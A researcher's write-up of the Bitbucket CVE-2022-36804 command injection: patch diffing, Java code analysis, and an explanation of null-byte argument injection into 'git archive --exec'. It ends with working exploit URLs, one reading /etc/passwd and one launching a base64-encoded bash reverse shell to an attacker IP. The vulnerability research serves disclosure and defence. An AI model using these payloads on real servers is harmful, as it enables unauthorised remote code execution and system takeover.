---
title: "[CVE-2022-36804] Bitbucket Pre-auth RCE Vulnerability"
slug: fokg4x
translationKey: fokg4x
date: 2022-08-30T11:17:25+08:00
source: yuque/penetration
---

# Critical severity command injection vulnerability - CVE-2022-36804
Official advisory: [https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html](https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html)

Let's diff 8.3.0 vs 8.3.1, and get familiar with the workflow of diffing jar packages in IDEA along the way:

+ [https://product-downloads.atlassian.com/software/stash/downloads/atlassian-bitbucket-8.3.0-x64.bin](https://product-downloads.atlassian.com/software/stash/downloads/atlassian-bitbucket-8.3.0-x64.bin)
+ [https://product-downloads.atlassian.com/software/stash/downloads/atlassian-bitbucket-8.3.1-x64.bin](https://product-downloads.atlassian.com/software/stash/downloads/atlassian-bitbucket-8.3.1-x64.bin)

Analyzing the patch, two suspicious spots were found:

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1661829452233-9b67c7b5-742c-44b7-bc8a-4fcae28ffa97.png)

## patch#1


found `bitbucket/atlassian-bitbucket-8.3.0-x64/app/WEB-INF/lib/nuprocess-2.0.2-atlassian-3.jar!/com/zaxxer/nuprocess/NuProcessBuilder.class`



the patch#1 is like:

```plain
 this.ensureNoNullCharacters(commands);
```

A new method `ensureNoNullCharacters` was added

+ command.indexOf(0): checks whether the command contains the `\u0000` character
+ If it does, an exception is thrown directly: `Commands may not contain null characters` — you can add this hint value in your PoC

```java
private void ensureNoNullCharacters(List<String> commands) {
    Iterator var2 = commands.iterator();

    String command;
    do {
        if (!var2.hasNext()) {
            return;
        }

        command = (String)var2.next();
    } while(command.indexOf(0) < 0);

    throw new IllegalArgumentException("Commands may not contain null characters");
}
```

The full patch is below:

```java

public class NuProcessBuilder {
    private static final NuProcessFactory factory;
    private final List<String> command;
    private final TreeMap<String, String> environment;
    private Path cwd;
    private NuProcessHandler processListener;

    public NuProcessBuilder(List<String> commands, Map<String, String> environment) {
        if (commands != null && !commands.isEmpty()) {
            this.ensureNoNullCharacters(commands);	//patch
            this.environment = new TreeMap(environment);
            this.command = new ArrayList(commands);
        } else {
            throw new IllegalArgumentException("List of commands may not be null or empty");
        }
    }

    public NuProcessBuilder(List<String> commands) {
        if (commands != null && !commands.isEmpty()) {
            this.ensureNoNullCharacters(commands);	//patch
            this.environment = new TreeMap(System.getenv());
            this.command = new ArrayList(commands);
        } else {
            throw new IllegalArgumentException("List of commands may not be null or empty");
        }
    }

    public NuProcessBuilder(String... commands) {
        if (commands != null && commands.length != 0) {
            List<String> commandsList = Arrays.asList(commands);	//patch
            this.ensureNoNullCharacters(commandsList);	//patch
            this.environment = new TreeMap(System.getenv());
            this.command = new ArrayList(commandsList);
        } else {
            throw new IllegalArgumentException("List of commands may not be null or empty");
        }
    }
```



## patch#2


another patch is at `bitbucket/atlassian-bitbucket-8.3.0-x64/app/WEB-INF/lib/bitbucket-process-8.3.1.jar`

A call was added:

```plain
  addIf(NioProcessParameters$Builder::nonNullAndNoNullChar, this.arguments, value);
```

The full text is:

```java

    private static boolean nonNullAndNoNullChar(String value) {
        if (value == null) {
            return false;
        } else {
            requireNoNullChars(value);
            return true;
        }
    }

    private static void requireNoNullChars(String value) {
        if (value.indexOf(0) >= 0) {
            throw new IllegalArgumentException("Unsupported \\0 character detected: " + value);
        }
    }

    private static String requireNonBlankAndNoNullChar(String value, String msg) {
        requireNonBlank(value, msg);
        requireNoNullChars(value);
        return value;
    }
```

Also, for those who's not familiar with `NuProcessBuilder`, check: [https://github.com/brettwooldridge/NuProcess](https://github.com/brettwooldridge/NuProcess)

`NuProcess` is open-source code that makes it easy to execute commands across different operating systems; Bitbucket uses Atlassian's own modified version of it

```java
public class NuProcessBuilder {
	//...
  static {
        String factoryClassName = null;
        String osname = System.getProperty("os.name").toLowerCase();
        if (!osname.contains("mac") && !osname.contains("freebsd")) {
            if (osname.contains("win")) {
                factoryClassName = "com.zaxxer.nuprocess.windows.WinProcessFactory";
            } else if (osname.contains("linux")) {
                factoryClassName = "com.zaxxer.nuprocess.linux.LinProcessFactory";
            } else if (osname.contains("sunos")) {
                factoryClassName = "com.zaxxer.nuprocess.solaris.SolProcessFactory";
            }
        } else {
            factoryClassName = "com.zaxxer.nuprocess.osx.OsxProcessFactory";
        }

        if (factoryClassName == null) {
            throw new RuntimeException("Unsupported operating system: " + osname);
        } else {
            try {
                Class<?> forName = Class.forName(factoryClassName);
                factory = (NuProcessFactory)forName.newInstance();
            } catch (Exception var3) {
                throw new RuntimeException(var3);
            }
        }
    }
```

Following further down, we finally land on NuProcess; the green parts are what the patch added

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1661829483649-e71597c8-ae77-4bc7-beb1-b766f8b5c72e.png)

## Analysis 1
After analysing the old version of [nuprocess](https://mvnrepository.com/repos/atlassian-3rdparty), it turns out to be functional updates, not security patch.

At first, while analyzing Atlassian's modified [nuprocess](https://mvnrepository.com/repos/atlassian-3rdparty), I thought there was some security hardening, but it turned out to be just feature updates.



Analyzing the related code with the keyword `NuProcess`, we find:



```plain
atlassian-bitbucket-8.3.0-x64/app/WEB-INF/classes/stash-context.xml

NuNioProcess

NioProcess


NioNuProcessHandler
	exitHandler
	commandLine

NioProcessParameters
	nonNullAndNoNullChar
	this.arguments


# install

```



The vulnerability likely abuses `\u0000` to perform some kind of bypass — command injection, Null Byte Injection

On September 16, 2022, I read the analysis article on Anquanke: <[https://www.anquanke.com/post/id/280193](https://www.anquanke.com/post/id/280193)>

The approach was right, just missing some pieces.

> + Bitbucket is built in Java and invokes git commands under the hood; the separator is the null byte (`0x00`)
> + The null byte allows injecting characters and malicious arguments.
>



![](https://cdn.nlark.com/yuque/0/2022/png/166008/1663366579780-675501c8-bc47-432e-b8c9-eb41c398ad64.png)

> <font style="color:rgb(88, 88, 88);">According to the official disclosure, the vulnerability's effect is that command execution is possible with only read access. By enumerating all the git commands Bitbucket can construct with read-only permissions, one spot was found where arguments can be injected; crafting a malicious URL to visit it results in arbitrary command execution.</font>
>

Argument injection

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1663361011191-77ecc70d-cc19-4453-a47c-9e88302382d0.png)

I tested the relevant payloads and found they never hit my breakpoints, which was puzzling.

## Analysis 2:


It was probably an abuse of the archive module ([https://git-scm.com/docs/git-archive](https://git-scm.com/docs/git-archive)), because in [git's source code](https://github1s.com/git/git/blob/HEAD/contrib/completion/git-completion.bash#L815), only archive has a remote argument

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1663366540711-6f9a5589-ec9c-4c81-800d-a6c2b8bb887b.png)

# Hypothesis
The 8.3.0-to-8.3.1 upgrade mainly involves two files:

+ `bitbucket/atlassian-bitbucket-8.3.0-x64/app/WEB-INF/lib/nuprocess-2.0.2-atlassian-3.jar`
    - Originally open-sourced on GitHub; the Atlassian dev team did secondary development on it
+ `bitbucket/atlassian-bitbucket-8.3.0-x64/app/WEB-INF/lib/bitbucket-process-8.3.0.jar`
    - Basically just wraps some command-execution functions (if anything calls into these functions, there is likely risk)
    - But no call chain was found anywhere globally — only a bean id, with no idea how to trigger it

# Patch Analysis
(1) In `bitbucket-process-8.3.0.jar`, there are these two patches

```java
addIf(NioProcessParameters$Builder::nonNullAndNoNullChar, this.arguments, value);
```

The function definitions are below; they simply check for `\u0000` — why check for NULL though?

```java

    private static boolean nonNullAndNoNullChar(String value) {
        if (value == null) {
            return false;
        } else {
            requireNoNullChars(value);
            return true;
        }
    }

    private static void requireNoNullChars(String value) {
        if (value.indexOf(0) >= 0) {
            throw new IllegalArgumentException("Unsupported \\0 character detected: " + value);
        }
    }

    private static String requireNonBlankAndNoNullChar(String value, String msg) {
        requireNonBlank(value, msg);
        requireNoNullChars(value);
        return value;
    }
```



(2) The patch for `nuprocess-2.0.2-atlassian-3.jar`

It adds the `ensureNoNullCharacters` validation,

```java
public class NuProcessBuilder {
    private static final NuProcessFactory factory;
    private final List<String> command;
    private final TreeMap<String, String> environment;
    private Path cwd;
    private NuProcessHandler processListener;

    public NuProcessBuilder(List<String> commands, Map<String, String> environment) {
        if (commands != null && !commands.isEmpty()) {
            this.ensureNoNullCharacters(commands);	//patch
            this.environment = new TreeMap(environment);
            this.command = new ArrayList(commands);
        } else {
            throw new IllegalArgumentException("List of commands may not be null or empty");
        }
    }

    public NuProcessBuilder(List<String> commands) {
        if (commands != null && !commands.isEmpty()) {
            this.ensureNoNullCharacters(commands);	//patch
            this.environment = new TreeMap(System.getenv());
            this.command = new ArrayList(commands);
        } else {
            throw new IllegalArgumentException("List of commands may not be null or empty");
        }
    }

    public NuProcessBuilder(String... commands) {
        if (commands != null && commands.length != 0) {
            List<String> commandsList = Arrays.asList(commands);	//patch
            this.ensureNoNullCharacters(commandsList);	//patch
            this.environment = new TreeMap(System.getenv());
            this.command = new ArrayList(commandsList);
        } else {
            throw new IllegalArgumentException("List of commands may not be null or empty");
        }
    }
```

The function's role is still to validate that no NULL characters are present.

```java
private void ensureNoNullCharacters(List<String> commands) {
    Iterator var2 = commands.iterator();

    String command;
    do {
        if (!var2.hasNext()) {
            return;
        }

        command = (String)var2.next();
    } while(command.indexOf(0) < 0);

    throw new IllegalArgumentException("Commands may not contain null characters");
}
```



So why all this heavy validation of NULL characters?

A preliminary guess: the attacker calls a command-execution function **in some way**, possibly via:

+ Arbitrary object instantiation (similar to the Spring-Core deserialization, changing some important variable; but historically only port 7995 had a deserialization issue, never the HTTP port)
+ Some obscure feature, for example the pile of old scm functionality — I didn't follow up on it, but judging from historical write-ups, it may be promising.

Then NULL bytes are used to bypass some restriction?? Let the imagination run wild..

For now:

+ No call site for the command execution has been found

![whiteboard](https://cdn.nlark.com/yuque/0/2022/jpeg/166008/1663835233049-3e3a6e4d-0a64-4ae8-be49-99299b537c11.jpeg)

## Hindsight
After getting nowhere analyzing the Anquanke article, a real PoC finally appeared on GitHub ([https://github.com/notxesh/CVE-2022-36804-PoC/blob/main/CVE-2022-36804.py](https://github.com/notxesh/CVE-2022-36804-PoC/blob/main/CVE-2022-36804.py)).

Let's trace the vulnerability's call stack and analyze the cause.

First, figure out what type of vulnerability this is — argument injection.

::::color1
**In the**`**git archive**`**command, a null character is used to inject the**`**--exec**`**option, thereby executing arbitrary commands.**

::::

::::danger
To fully reproduce this vulnerability, a few questions must first be answered:

+ Why `%00`?
+ Why can only options be injected, instead of direct command injection with &&, ||, and the like?
+ Why git archive?

::::

### (1) Why `%00`
![](https://cdn.nlark.com/yuque/0/2022/png/166008/1663838083365-fbd7f1b1-f26f-4683-98c2-1d9cb23a1b91.png)



![](https://cdn.nlark.com/yuque/0/2022/png/166008/1663838092553-7bc9b627-f9c8-4f70-97f8-46ab120a56c2.png)



The flip side of this question is: why can `%00` inject arguments while the commonly used space `%20` cannot.

> Testing under bash, the null character turns out to be ignored by bash.
>
> So the null character is not a default delimiter in bash.
>

```bash
$ printf "cat\\x00/etc/passwd" |sh
sh: line 1: cat/etc/passwd: No such file or directory
```

So let's backtrack: how does the Bitbucket backend concatenate git commands? Looking back at the Anquanke article, it mentions the key function Bitbucket uses to build the command:

```java
import java.util.*;
import java.lang.*;
import java.util.ArrayList;
import java.util.Arrays;

public class check_null
{
    public static void main(String xyz[])
    {
        String[] stringArray = new String[]{"git", "archive", "Hello\u0000World!", "-- "};
        List<String> command = new ArrayList(Arrays.asList(stringArray));

        String[] cmdarray = (String[])command.toArray(new String[0]);
        byte[][] args = new byte[cmdarray.length - 1][];
        System.out.println( args );

        int size = args.length;

    // Take the git command array arguments, from index 1 onward, and store them into args[][]
        for(int i = 0; i < args.length; ++i) {
            args[i] = cmdarray[i + 1].getBytes();
            size += args[i].length;
        }

    // The byte array argBlock that ultimately stores the arguments
        byte[] argBlock = new byte[size];
        int i = 0;
        byte[][] var9 = args;
        int var10 = args.length;

        for(int var11 = 0; var11 < var10; ++var11) {
            byte[] arg = var9[var11];
        // Use system.arraycopy to copy the arg[][] two-dimensional array into argBlock
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }

        System.out.println(args);
        System.out.println(argBlock);
    }
}

```

As you can see, the input is a **command array** and the return value is an **argument list**. Through this processing, the `NUL` character inside our `Hello\u0000World!` sneaks its way into the argument list, as illustrated below:

```java
# input
{"git", "archive", "Hello\u0000World!", "-- "};  

# output
[a, r, c, h, i, v, e, <NUL>, H, e, l, l, o,  <NUL>, W, o, r, l, d, !, <NUL>, -, -,  , <NUL>]

==  {'archive', 'Hello', 'World!', '--' }
```

So now we have achieved argument injection.

### (2) Why argument injection only, not command injection
Similarly, the command gets parsed into arg_list, an argument list, so we can add arguments by injecting null bytes.

But we cannot change the execution order, nor perform command injection by adding logical operators.

> Common sense: with `{"git", "--prefix=<INJECT>"}`, even if `<INJECT>` is controllable, you still cannot inject other **commands**. That's because the entity executing the command is git at this point, not some other executable. All content of the second argument is only ever treated as options to the git command.
>

Therefore, we cannot directly use && or || for injection (changing execution logic/execution order); we can only try to add malicious options.

### (3) Why git archive?
Because git archive is accessible unauthenticated — it corresponds to the front-end download feature.

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1663836672685-0489d0e8-1ee5-46a4-89fc-d9716ca59cd0.png)

archive has an `--exec` option, which can be abused to execute commands.

# EXP
> [https://github.com/notxesh/CVE-2022-36804-PoC/blob/main/CVE-2022-36804.py](https://github.com/notxesh/CVE-2022-36804-PoC/blob/main/CVE-2022-36804.py)
>

```basic
# rce
http://10.10.111.35:7990/rest/api/latest/projects/PUB/repos/repo/archive?format=zip&&path=&prefix=test/%00--remote=''%00--exec=echo+'Y2F0IC9ldGMvcGFzc3dkCg=='+%7c+base64+-d++%7c+sh;%00


# reverse shell
http://10.10.111.35:7990/rest/api/latest/projects/PUB/repos/repo/archive?format=zip&=&path=&prefix=test/%00--remote=''%00--exec=echo+'YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xMTEuMS80NDQ0IDA%2bJjEK'+%7c+base64+-d++%7c+sh;%00
```

Note: the executed command is not fully echoed back — the output gets truncated; just treat it as a blind RCE

For example, executing `cat /etc/passwd` only showed `root`

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1663834464289-1983a17b-5098-432f-8bd2-28a9d6f4c876.png)



# Ref
+ Install Note:[https://confluence.atlassian.com/bitbucketserver/supported-platforms-776640981.html](https://confluence.atlassian.com/bitbucketserver/supported-platforms-776640981.html)
+ [https://www.geek-share.com/detail/2803770907.html](https://www.geek-share.com/detail/2803770907.html)
+ [https://www.anquanke.com/post/id/280193](https://www.anquanke.com/post/id/280193)
+ [2019 5th Internet Security Leader Summit — Exploring the Common Attack Surface of Git-based Version Control Services.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/166008/1663835877718-1ff64386-f5d0-4a9a-9077-d2d8d7a809f0.pdf)
